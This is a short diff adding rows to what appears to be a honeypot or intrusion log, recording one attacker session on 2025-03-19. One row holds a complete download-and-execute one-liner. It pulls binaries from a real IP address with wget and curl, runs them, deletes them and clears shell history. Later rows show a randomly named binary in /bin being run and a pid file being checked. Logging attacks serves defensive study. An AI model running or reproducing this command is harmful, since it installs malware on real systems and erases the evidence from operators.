@@ -1,0 +1,4 @@
+"76","dc558e382ba1","2025-03-19 15:10:06",\N,"1","#!/bin/sh; PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; wget http://43.249.172.195:888/112; curl -O http://43.249.172.195:888/112; chmod +x 112; ./112; wget http://43.249.172.195:888/112s; curl -O http://43.249.172.195:888/112s; chmod +x 112s; ./112s; rm -rf 112.sh; rm -rf 112; rm -rf 112s; history -c"
+"77","dc558e382ba1","2025-03-19 15:11:44",\N,"1","/bin/eyshcjdmzg"
+"78","dc558e382ba1","2025-03-19 15:11:44",\N,"0","/bin/eyshcjdmzg"
+"79","dc558e382ba1","2025-03-19 15:11:45",\N,"1","ls -la /var/run/gcc.pid"
